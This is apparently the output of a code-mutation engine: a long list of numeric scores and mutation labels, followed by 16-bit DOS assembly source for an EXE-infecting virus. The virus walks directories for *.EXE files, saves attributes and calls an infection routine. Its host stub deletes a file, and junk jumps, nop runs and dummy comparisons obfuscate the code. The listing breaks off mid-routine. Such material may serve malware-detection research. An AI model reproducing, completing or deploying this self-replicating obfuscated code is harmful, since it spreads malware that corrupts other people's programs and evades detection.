;0.728585890319
;1.18658372137
;0.936912516072
;1.14531570964
;0.997327993931
;1.04926815222
;0.864892395315
;1.25780189031
;UntouchBlock_0
;0.817481803587
;1.0258553256
;1.02890460159
;0.708451269935
;1.23146109636
;NoMutation
;0.767312094813
;0.913143475011
;0.969042031361
;0.682793477921
;0.933722315185
;1.02646657338
;0.82255520955
;0.835799681647
;0.664865220071
;0.80091212585
;0.768666697579
;ForcedJMP_0
;0.97890811199
;1.44490852755
;0.962545520053
;0.736008049547
;UntouchBlock_0
;0.903471358432
;UntouchBlock_0
;0.973688870928
;ForcedJMP_0
;0.929892612594
;0.87757614561
;1.08477066613
;1.04878550593
;1.00042974114
;0.843959832991
;NoMutation
;0.977353929827
;0.813332495451
;0.972596671654
;0.723764651091
;NoMutation
;1.12728790693
;0.874800373324
;		JNZ 	_0
;0.915094392109
;UntouchBlock_0
;0.662382668518
;0.816576764063
;0.719493701592
;0.950979461963
;0.952268573324
;ForcedJMP_1
;0.693704055107
;0.447914323917
;1.04821574932
;ForcedJMP_1
;1.28325681396
;0.605868560511
;0.930326458668
;		JNZ 	_0
;0.668262111502
;UntouchBlock_0
;0.906940099311
;0.899220377239
;UntouchBlock_1
;0.722739709318
;1.04233976341
;0.822790905467
;0.826670918188
;0.809336725794
;0.896791559309
;0.800981463263
;1.20002855682
;0.841016979804
;0.521815391994
;0.836978061964
;0.692407345807
;0.777806177024
;0.741931387368
;0.970437804376
;UntouchBlock_1
;1.44622864374
;		JZ 	_0
;0.775362308265
;UntouchBlock_1
;0.941808717229
;0.997120022431
;0.768964359375
;NoMutation
;0.566175426709
;1.08940026133
;ForcedJMP_0
;1.48635794933
;0.956823507594
;		JZ 	_0
;1.08620250935
;0.790170033349
;ForcedJMP_0
;0.979672793129
;ForcedJMP_0
;0.911826153881
;1.112462635
;0.597715977111
;NoMutation
;1.08615822398
;		JZ 	_1
;1.15410936761
;UntouchBlock_1
;1.04973452374
;1.16167845013
;0.67568375955
;0.873745002035
;0.951150867304
;1.10407271316
;		JNZ 	_0
;0.637595863803
;UntouchBlock_1
;1.22535964028
;0.818522842685
;0.846765143101
;		JNZ 	_0
;0.524755650874
;0.850654736424
;0.968394400389
;0.793511088505
;UntouchBlock_0
;0.868785346953
;0.600200938774
;0.745343029119
;UntouchBlock_0
;0.87291077824
;0.785578691696
;0.733979903694
;0.942142495946
;0.857755225102
;UntouchBlock_0
;0.926508455711
;		JNZ 	_0
;0.537586999994
;0.675464466632
;0.956932247447
;0.853064625472
;0.728153968143
;		JZ 	_1
;0.745087087904
;0.79710401685
;0.941648143669
;0.657594744115
;UntouchBlock_1
;1.18263242449
;0.835558459569
;UntouchBlock_0
;0.827414344617
;0.790939771185
;1.09533811254
;0.768169172502
;		JZ 	_0
;0.709995555723
;0.846076526963
;0.621367365429
;NoMutation
;0.958277268919
;NoMutation
;0.755186497533
;0.694820597328
;0.728060617037
;0.721085626458
;0.841926926151
;0.852402449061
;0.703731873233
;0.996177168599
;0.627788225318
;0.650107730879
;UntouchBlock_0
;0.910996017674
;0.809515223647
;0.686215564929
;0.717821882545
;1.00090742089
;		JZ 	_1
;1.18107995579
;		JZ 	_1
;0.737765192475
;		JZ 	_0
;1.02293892781
;0.660648671911
;0.606512845457
;0.771396230925
;0.647669748528
;0.776728717086
;0.787458471207
;		JNZ 	_0
;0.676068416327
;0.578139672102
;0.763375518479
;		JNZ 	_0
;0.693925484509
;0.72579335381
;		JNZ 	_0
;0.560626348581
;0.786262596522
;0.623458116162
;0.818071923667
;0.791373543227
;0.791555336642
;0.59074767114
;0.638174962285
;0.666109149986
;0.878601298311
;0.912396478196
;		JNZ 	_0
;0.629737714829
;		JZ 	_1
;0.958368783362
;0.695339383693
;NoMutation
;0.566987799316
;0.530787128004
;		JZ 	_0
;0.795604164887
;1.09150850148
;UntouchBlock_0
;0.685377982987
;0.622743932178
;ForcedJMP_0
;0.883546890441
;ForcedJMP_0
;0.939701370882
;0.668423555938
;0.738267038849
;0.857831155925
;NoMutation
;0.566650761379
;0.591364721548
;0.654966697415
;0.611081402425
;		JZ 	_0
;0.917918508939
;0.66712392259
;		JZ 	_1
;0.859263778965
;0.502165948724
;		JZ 	_1
;0.638251573256
;0.575188193739
;1.2526233909
;ForcedJMP_0
;0.905941478932
;UntouchBlock_0
;0.652024787524
;0.968075841825
;0.632375487439
;0.632799634062
;NoMutation
;0.725769241941
;0.793723623697
;0.52409604249
;0.891243543343
;0.620786253111
;UntouchBlock_0
;0.821153223589
;		JNZ 	_1
;0.545308992367
;0.63612502479
;0.647348404834
;0.824960984291
;		JNZ 	_1
;0.528282471053
;0.529283332207
;0.682346232926
;0.835628114164
;0.57006320238
;0.674960951988
;0.939260441151
;		JZ 	_0
;0.777280918616
;0.444727498534
;		JZ 	_1
;0.69399471925
;		JZ 	_1
;0.512495973201
;		JNZ 	_0
;0.514061718534
;0.488187465474
;		JZ 	_0
;0.468353073312
;0.619399655521
;UntouchBlock_1
;0.659635677302
;UntouchBlock_1
;0.491078788607
;0.437778867284
;NoMutation
;0.501279329779
;0.363158573232
;NoMutation
;0.415018302108
;UntouchBlock_0
;0.476536428666
;		JNZ 	_1
;0.553604245852
;0.752858470822
;NoMutation
;0.675436999588
;NoMutation
;0.541585733417
;0.756962984689
;0.527692975186
;0.591017673457
;0.646341732668
;0.437943428231
;NoMutation
;0.705455554901
;		JZ 	_0
;0.476771743723
;		JNZ 	_0
;0.690263430042
;UntouchBlock_0
;0.796335209184
;NoMutation
;0.505936064204
;0.739977194075
;UntouchBlock_1
;0.798340726267
;0.779626493427
;		JNZ 	_1
;0.790815617863
;ForcedJMP_1
;0.911575940436
;UntouchBlock_0
;0.503440117669
;		JZ 	_0
;0.711407434176
;0.506748697084
;0.71863000872
;0.455920154768
;0.55276190595
;0.533907084323
;0.611596664122
;0.721877713336
;		JNZ 	_0
;0.425969850701
;0.387832839688
;0.627179320171
;0.769331483171
;0.466936464279
;NoMutation
;0.336746693942
;		JNZ 	_1
;0.551857833524
;ForcedJMP_0
;0.746515277891
;		JNZ 	_0
;0.7652625496
;0.384293071198
;0.38618010812
;ForcedJMP_0
;0.614578407613
;0.437621332494
;		JZ 	_1
;0.572983052975
;		JNZ 	_1
;0.656887878138
;UntouchBlock_1
;0.448951368499
;0.348387430978
;UntouchBlock_0
;0.466076395542
;NoMutation
;0.484537211984
;NoMutation
;0.695935147453
;UntouchBlock_0
;0.618278892148
;		JNZ 	_0
;0.414909220269
;0.527151776125
;UntouchBlock_0
;0.574231649335
;UntouchBlock_0
;0.399304965335
;0.473862278489
;UntouchBlock_1
;0.500836593492
;UntouchBlock_1
;0.332573649296
;0.3349966419
;0.444533904959
;UntouchBlock_0
;0.456323272089
;ForcedJMP_1
;0.336458001383
;0.380356093739
;0.494770075896
;0.30163624403
;0.489453550599
;ForcedJMP_1
;0.459089092453
;0.554587947793
;0.467857131514
;0.434895919638
;NoMutation
;0.327568750536
;0.502959808862
;		JZ 	_0
;0.339824271467
;0.416131053318
;0.273776570501
;0.388369403089
;0.353421835438
;0.414212989437
;UntouchBlock_1
;0.280045811777
;		JZ 	_0
;0.444873021924
;UntouchBlock_0
;0.33170129774
;0.323690221495
;UntouchBlock_0
;0.233578710079
;		JZ 	_1
;0.316116449194
;		JNZ 	_0
;0.286633219796
;0.410951292824
;		JZ 	_1
;0.237773701029
;0.334879492124
;0.252146574515
;0.325879624926
;		JNZ 	_0
;0.222580259256
;0.328935024639
;		JZ 	_0
;0.246218818765
;0.349646721507
;ForcedJMP_1
;0.292568011993
;0.212213461889
;0.308087597058
;		JNZ 	_0
;0.320217303242
;		JNZ 	_0
;0.231301887894
;0.298831661886
;0.205705095491
;0.325129623751
;ForcedJMP_1
;0.289795255126
;0.213658255359
;NoMutation
;0.310310397821
;0.199072961271
;0.252508079288
;0.196875195993
;0.185123859865
;0.2196255364
;0.170207840275
;		JZ 	_0
;0.104063655586
;UntouchBlock_1
;0.132055955175
;		JNZ 	_1
;0.23883810559
;		JZ 	_0
;0.161863433022
;0.150982957133
;ForcedJMP_0
;0.119650493266
;		JZ 	_0
;0.0915003634223
;0.0786326045882
;0.133146279708
;0.0961459645267
;0.101132345436
;		JNZ 	_0
;0.111079878402
;ForcedJMP_0
;0.0727420560835
;		JZ 	_0
;0.0789412829338
;0.0425257131161
;		JZ 	_0
;0.0535209501366
;		JNZ 	_1
;0.036029772788
;0.0249360942034
;0.0136046099879
;0.106157041613
;0.293679517087
;1.12491312515
;0.848850391134
;0.653681632436
;1.02662765153
;0.841382418337
;0.934732519547
;1.21583248692
;0.558925271477
;1.02575096161
;		JZ 	_0
;0.471322556609
;0.292923164606
;1.02754904487
;		JZ 	_1
;0.662203509566
;0.478874372431
;1.30694647586
;0.658708772126
;1.02520374099
;1.20098848412
;0.83323299185
;NoMutation
;0.919959074902
;1.18470234646
;		JZ 	_0
;1.44458560481
;0.6367091137
;1.09296266534
;UntouchBlock_1
;1.36255431136
;0.907076907216
;0.911108573385
;1.18088639959
;NoMutation
;0.725004828074
;0.989969162637
;		JNZ 	_1
;0.6432242504
;ForcedJMP_0
;1.26991922318
;0.727591425654
;1.15055372269
;ForcedJMP_0
;0.734502780429
;1.15225132799
;0.71957861571
;0.459984170671
;1.05445337084
;		JNZ 	_1
;0.521320596966
;0.961793686212
;0.359521215762
;1.03571991834
;1.20574712416
;0.769805148367
;		JZ 	_1
;1.04494329727
;1.21291138827
;ForcedJMP_0
;0.701218961357
;UntouchBlock_1
;0.187019093815
;0.948238375003
;0.683471665342
;1.01985396317
;0.834091281945
;0.666734772224
;		JNZ 	_0
;0.494976299445
;0.905398827861
;0.676707800588
;UntouchBlock_0
;1.08891396988
;0.76043667333
;1.2236007804
;1.4228660255
;0.719470129877
;		JNZ 	_1
;0.622374314112
;0.852338431736
;UntouchBlock_1
;0.709911411138
;		JZ 	_0
;0.892928190274
;0.738844162622
;		JNZ 	_1
;1.31559095502
;		JZ 	_0
;1.00914728542
;0.752194457775
;1.25737196714
;ForcedJMP_0
;0.90245783425
;1.13706322486
;0.744548401172
;		JNZ 	_0
;0.794243771637
;UntouchBlock_1
;0.856658531288
;		JZ 	_1
;0.93439852383
;0.719385901149
;0.912406311762
;		JNZ 	_1
;0.722605707783
;UntouchBlock_0
;0.758337032013
;0.603637441869
;0.832235935419
;0.973366745551
;1.0291258434
;0.753634948422
;ForcedJMP_0
;0.765270907541
;0.956322164395
;1.2969768538
;ForcedJMP_0
;0.813867068061
;1.04057969661
;1.03004960974
;0.856134858433
;0.551015973402
;0.803265423762
;		JNZ 	_0
;0.622840982565
;		JNZ 	_0
;0.845985191867
;		JNZ 	_1
;1.18054815851
;ForcedJMP_0
;0.763840146642
;		JNZ 	_1
;1.10307983956
;0.811236320984
;1.26650213051
;0.516469257155
;ForcedJMP_1
;0.591666846423
;UntouchBlock_1
;0.915787894504
;0.664147442825
;0.881924172674
;0.745465178704
;ForcedJMP_1
;0.941582437513
;ForcedJMP_0
;1.07888885836
;UntouchBlock_0
;0.748002352463
;0.6078352482
;ForcedJMP_1
;1.08172236265
;0.776808770188
;1.11741442486
;		JZ 	_0
;1.05170700326
;0.727089883813
;0.89038052148
;0.59469004197
;0.738699599342
;0.76825261592
;0.627752288501
;0.733628151824
;UntouchBlock_0
;0.575673943969
;0.531778848751
;ForcedJMP_0
;0.755183791674
;0.61228432838
;0.675687435134
;0.973973785024
;1.01731323425
;0.607008560487
;0.661524379412
;0.941653232029
;0.810835314267
;0.785983476368
;0.822344576546
;0.368761765937
;0.939656207133
;1.19032677501
;1.04776947207
;UntouchBlock_0
;0.55151003199
;NoMutation
;0.489264119947
;UntouchBlock_1
;0.875595508632
;NoMutation
;0.59617556163
;NoMutation
;0.58153100393
;0.643664792083
;0.579378514557
;ForcedJMP_1
;0.576490965532
;ForcedJMP_0
;0.797178378313
;0.510245594374
;0.57159924711
;0.912586158033
;		JNZ 	_0
;0.71326181228
;UntouchBlock_0
;0.739203701323
;0.749354164098
;0.584982223334
;		JNZ 	_0
;0.564172503609
;0.634481638945
;0.457230924152
;0.820290367064
;0.517639454084
;UntouchBlock_1
;0.381085371787
;0.692254089372
;0.463711291027
;UntouchBlock_1
;0.749742589528
;UntouchBlock_0
;0.707361351072
;		JNZ 	_0
;0.930065567795
;ForcedJMP_1
;0.511408978555
;0.593460418581
;0.867543181554
;0.787291108351
;0.893569757313
;0.508063212836
;0.633434037146
;0.661281544294
;0.466469056646
;UntouchBlock_1
;0.444806315998
;		JNZ 	_0
;0.430869976442
;NoMutation
;0.581246776591
;		JNZ 	_0
;0.670393149438
;		JNZ 	_1
;0.705916086177
;0.521388953107
;		JNZ 	_1
;0.671992284258
;NoMutation
;0.446665403551
;ForcedJMP_0
;0.880010340115
;NoMutation
;0.455307689816
;0.468169550211
;0.68386566998
;0.604321219833
;		JNZ 	_1
;0.658936029106
;UntouchBlock_0
;0.438527045956
;0.555788098382
;0.532212468852
;0.359713744891
;0.501798943794
;ForcedJMP_0
;0.329358124376
;0.656664828516
;ForcedJMP_0
;0.425428733921
;0.48782276144
;UntouchBlock_0
;0.318529731716
;0.455061641414
;UntouchBlock_1
;0.384896040083
;0.521783932893
;0.337103094301
;0.463549202095
;0.323909358254
;ForcedJMP_0
;0.474944318268
;0.363340325319
;UntouchBlock_1
;0.372939190344
;ForcedJMP_0
;0.290931252914
;0.383223246876
;ForcedJMP_0
;0.480266371934
;UntouchBlock_0
;0.400048667559
;0.36348550108
;0.338192283229
;NoMutation
;0.297238824787
;		JZ 	_0
;0.275010413718
;0.319382429846
;UntouchBlock_1
;0.263565942885
;UntouchBlock_1
;0.23759778661
;		JZ 	_0
;0.272640424687
;NoMutation
;0.274884158133
;		JZ 	_1
;0.220828762691
;0.251034628222
;UntouchBlock_1
;0.176873183235
;0.13729936974
;0.203894646395
;UntouchBlock_0
;0.227422327201
;ForcedJMP_0
;0.19110609477
;0.182235924012
;0.185988824664
;0.173876517207
;ForcedJMP_0
;0.129929986568
;0.163590613745
;		JZ 	_1
;0.11489926797
;UntouchBlock_1
;0.0956411399039
;		JNZ 	_0
;0.0563617016228
;0.0474096732495
;		JZ 	_0
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
MYYLN:
XQYLS:
		JMP 	_HWRC
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
_HWRC:
		JMP 	LB_QH
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
LB_QH:
	 mov ds,ax
KYXYP:
	 mov dx,OFFSET PGMSTR
JBKLB:
YVHPA:
UEQV_:
		JMP 	GRHIN
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
GRHIN:
	 mov ah,41H
HPCNZ:
YQT_A:
	 int 21H 
	 mov ah,4CH
		JMP 	FY_EQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FY_EQ:
	 mov al,0
URXMP:
UJ_IP:
_RVAO:
IK_VF:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 
JTGBP:
		call 	 VGPVM
VNRSI:
INWJN:
		call 	 ZGYLS
XZGDK:
		call 	 PRZUT
		call 	 HVKCD
ST_QS:
		call 	 AM_YM


VIRUS:
		 push ax
		JMP 	GQWWL
nop
nop
nop
nop
nop
nop
nop
GQWWL:
		 mov ax,cs
		 mov ds,ax 						
JZ PRZUT
JMP XZGDK
PRZUT:
JZ HVKCD
JMP VNRSI
HVKCD:
		JMP 	JTGBP
VGPVM:
		 mov ax,es 						
		cmp 	bx,ax
JZ AM_YM
JMP ST_QS
AM_YM:
		 mov WORD PTR [OLDDTA+2],ax 	
		JMP 	RAZQF
_OQDL:
JNZ ZGYLS
JMP INWJN
ZGYLS:
		JMP 	OVVFG
ANBST:
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
ETBJF:
LQ_WS:
		call 	 JAKZR
RAZQF:
		call 	 _OQDL
		call 	 FOGCD


FINISH:  call RESTORE_DTA 	
RGXSV:
		call 	 UQVWI
OVVFG:
		call 	 ANBST
PPVNC:
		call 	 JDNTZ
DTCFH:
		call 	 GXCDS
 		 pop ax

REL1: 						
		JMP 	QUGOG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QUGOG:
 		 mov ax,HSTACK 				
		JMP 	ETBJF
FOGCD:
 		 cli 
		JMP 	RFLDG
cmp ax,bx
RFLDG:
 		 mov ss,ax
		JMP 	LQ_WS
JAKZR:
JZ ZKDXX
JMP ZKURE
ZKURE:
		call 	 ZKDXX
CYKAF:
		call 	 EREER
WSHFB:
		call 	 UA_SR
ESXHI:
		call 	 SLWSJ
ZKDXX:

REL1A: 						
 		 mov sp,OFFSET HSTACK
		cmp 	cx,ax
JZ SLWSJ
JMP ESXHI
SLWSJ:
		JMP 	WSHFB
UA_SR:
		JMP 	HBNCO
nop
nop
nop
nop
nop
nop
nop
nop
HBNCO:
 		 mov es,WORD PTR [OLDDTA+2] 
JZ GXCDS
JMP DTCFH
GXCDS:
JNZ JDNTZ
JMP PPVNC
JDNTZ:
		cmp 	cx,cx
JNZ WLUZ_
JMP TQLIV
WLUZ_:
		JMP 	PQSUB
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
PQSUB:
		JMP 	QJHXH
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QJHXH:
		 mov ds,WORD PTR [OLDDTA+2] 
		cmp 	dx,cx
JNZ IVYLU
JMP EDN_F
IVYLU:
		cmp 	cx,ax
JZ L_CSD
JMP LJBN_
L_CSD:
		cmp 	bx,bx
JZ PDNIZ
JMP _FSBW
PDNIZ:
JNZ EREER
JMP CYKAF
EREER:
EDN_F:
		call 	 IVYLU
 		 sti 					

REL2:					 			
TQLIV:
		call 	 WLUZ_
TLJVR:
		call 	 UJMP_
 		jmp FAR PTR HOST 
_FSBW:
LJBN_:
		call 	 L_CSD
		call 	 PDNIZ
ZIWOK:
		call 	 KOMRR


FIND_FILE:
	mov al,’\’ 
		cmp 	ax,ax
JZ KOMRR
JMP ZIWOK
KOMRR:
		JMP 	OBGNC
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
OBGNC:
	mov BYTE PTR [USEFILE],al
		JMP 	RGXSV
UQVWI:
		JMP 	JYFKT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JYFKT:
		JMP 	PKLCC
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
PKLCC:
	mov si,OFFSET USEFILE+1
	xor dl,dl
	mov ah,47H
		JMP 	TLJVR
UJMP_:
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
PCGQO:
		call 	 JQAEL
	mov BYTE PTR [USEFILE],al 
		cmp 	dx,bx
JNZ YQORJ
JMP VHLSS
YQORJ:
		JMP 	SJF_F
SJF_F:
		call 	 KLGKO
VHLSS:
		call 	 YQORJ
OCOLO:
		call 	 PALHJ
KLGKO:

		JMP 	TODCA
nop
nop
nop
nop
TODCA:
		JMP 	MBEXB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
MBEXB:
FF2: mov al,2
		JMP 	OCOLO
PALHJ:
		JMP 	YYZOO
CZOGH:
		JMP 	LDXWG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
LDXWG:
	mov [LEVEL],al 
BZKBJ:
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
		cmp 	cx,cx
JZ JQAEL
JMP PCGQO
JQAEL:
	inc al 
		JMP 	FCDJW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FCDJW:
		JMP 	ATDDT
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ATDDT:
	mov [LEVEL],al 
		cmp 	bx,bx
JNZ MA_KR
JMP ZORZA
MA_KR:
JZ ZUCHP
JMP BFPYH
ZUCHP:
		JMP 	LWXCO
TIJHR:
		JMP 	BRIL_
ZVP_N:
YYZOO:
		call 	 CZOGH
BRIL_:
		call 	 ZVP_N
KGLQA:
		call 	 FHYBQ
LWXCO:
		call 	 TIJHR
ZORZA:
		call 	 MA_KR
	call FINDBR 

FF3:
AUPVP:
		call 	 DARCM
BFPYH:
		call 	 ZUCHP
GKQ_J:
		call 	 PJVQD
YYQCM:
		call 	 SXCAT
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
		JMP 	YYQCM
SXCAT:
		cmp 	dx,bx
JNZ PJVQD
JMP GKQ_J
PJVQD:
JZ DARCM
JMP AUPVP
DARCM:
		JMP 	SSMBJ
nop
nop
nop
nop
nop
nop
nop
nop
SSMBJ:
	mov si,OFFSET ALLFILE 
		cmp 	bx,bx
JNZ FHYBQ
JMP KGLQA
FHYBQ:
JZ QMXYY
JMP MHJJR
QMXYY:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
MHJJR:
		call 	 QMXYY
C__CL:
		call 	 JMMBX
CHRUI:
		call 	 XXJ_X
UHBPA:
		call 	 EZY_C
EDPHN:
		call 	 IIQYD
THDHF:
		call 	 UCTJD
NLFRM:
		call 	 FAZLX
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		JMP 	YBMDE
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YBMDE:
		mov di,OFFSET USEFILE
		JMP 	NLFRM
FAZLX:
		mov bx,OFFSET DTA2+1EH
		JMP 	UHBPA
EZY_C:
		mov al,[LEVEL]
		cmp 	cx,cx
JZ UCTJD
JMP THDHF
UCTJD:
JNZ XXJ_X
JMP CHRUI
XXJ_X:
JNZ JMMBX
JMP C__CL
JMMBX:
		JMP 	WRHKY
ZMTCF:
		mov dl,2BH 
		mul dl 
		add bx,ax 
		JMP 	D_DLP
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
D_DLP:
		mov si,bx
JNZ IIQYD
JMP EDPHN
IIQYD:
JNZ DASRX
JMP B_VWG
DASRX:
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WRHKY:
		call 	 ZMTCF
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
B_VWG:
		call 	 DASRX
		stosb

FBE1: mov al,1 
	or al,al
BTUV_:
		call 	 SQZOZ
LEJCE:
		call 	 WBXLK
	ret

M_PEP:
		call 	 TYOKE
FHRGV:
		call 	 _XBKA
FBE2: pop di 

FBE3: xor al,al 
 	  ret 
FPSMO:
DVTJW:
		call 	 OYVVH
DBDXX:
		call 	 GPI_Y
		call 	 HLILU


FINDEXE:
		mov dx,OFFSET DTA1 
		JMP 	LEJCE
WBXLK:
		mov ah,1AH
		JMP 	FHRGV
_XBKA:
		JMP 	DBDXX
GPI_Y:
		JMP 	FPSMO
HLILU:
		int 21H
		JMP 	XSLRT
nop
nop
nop
nop
XSLRT:
		mov di,OFFSET USEFILE
		JMP 	DVTJW
OYVVH:
		JMP 	BTUV_
SQZOZ:
		JMP 	GPJRW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
GPJRW:
		mov si,OFFSET EXEFILE
IMNEV:
		cmp 	bx,dx
JZ XEFHY
JMP KWW_W
XEFHY:
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
JZ VCGSK
JMP AXFWP
VCGSK:
JNZ NJBQT
JMP CGTUP
NJBQT:
		mov cx,3FH 
		cmp 	bx,dx
JZ AEBX_
JMP YZRUC
AEBX_:
		mov ah,4EH
		JMP 	VQGBH
JPXSI:
JZ JRPMX
JMP KXFUC
JRPMX:
JNZ TYOKE
JMP M_PEP
TYOKE:
CGTUP:
		call 	 NJBQT
KWW_W:
		call 	 XEFHY
KXFUC:
		call 	 JRPMX
AXFWP:
		call 	 VCGSK
KXECH:
		call 	 W_BVZ
E_ICJ:
		call 	 DDZQW
YZRUC:
		call 	 AEBX_
VQGBH:
		call 	 JPXSI
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		JMP 	ICFMH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ICFMH:
		mov di,OFFSET USEFILE
JNZ DDZQW
JMP E_ICJ
DDZQW:
		JMP 	VEDXB
UPVHZ:
		mov si,OFFSET DTA1+1EH
JMT_M:
JZ W_BVZ
JMP KXECH
W_BVZ:
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		JMP 	RM_ZU
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
RM_ZU:
		JMP 	QDAHF
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QDAHF:
		mov ah,4FH
		cmp 	cx,ax
JNZ XBKHP
JMP HTBMB
XBKHP:
JZ YRCLM
JMP ZVWMZ
YRCLM:
		int 21H 
HTBMB:
		call 	 XBKHP
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
		cmp 	bx,bx
JZ IHGQH
JMP HXWIB
IHGQH:
JNZ Z_BNS
JMP RNTUA
Z_BNS:
		JMP 	TGOKS
YKOPC:
		JMP 	HDLUM
DAMFN:
	 stc
VEDXB:
		call 	 UPVHZ
TGOKS:
		call 	 YKOPC
ZVWMZ:
		call 	 YRCLM
HXWIB:
		call 	 IHGQH
	 ret

FENC:
	 pop di
	 ret
HDLUM:
		call 	 DAMFN
D_PSE:
LIEQW:
		call 	 IXHRB
RNTUA:
		call 	 Z_BNS
NXYT_:
		call 	 WUYRF
		call 	 MHDAO
AOBEG:
KOZBL:
		call 	 WWUUL
		call 	 FHIBA


FIRSTDIR:
	 call GET_DTA
	 push dx 
		JMP 	LN_AQ
nop
nop
nop
nop
nop
LN_AQ:
	 mov ah,1AH 
JNZ FHIBA
JMP AOBEG
FHIBA:
	 int 21H
		JMP 	YJQHX
nop
nop
YJQHX:
	 mov dx,OFFSET USEFILE
		JMP 	KOZBL
WWUUL:
		JMP 	AAXER
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
AAXER:
	 mov cx,10H 
JZ WUYRF
JMP NXYT_
WUYRF:
		JMP 	LIEQW
IXHRB:
		JMP 	TAMVS
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TAMVS:
		JMP 	JGDCF
xor bx,cx
xor bx,cx
xor bx,cx
JGDCF:
		JMP 	BEHJL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
BEHJL:
	 mov ah,4EH 
		cmp 	cx,ax
JNZ XEGVQ
JMP FZ_MX
XEGVQ:
		JMP 	EQJNV
VNMHL:
JZ MHDAO
JMP D_PSE
MHDAO:
EQJNV:
		call 	 VNMHL
FZ_MX:
		call 	 XEGVQ
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
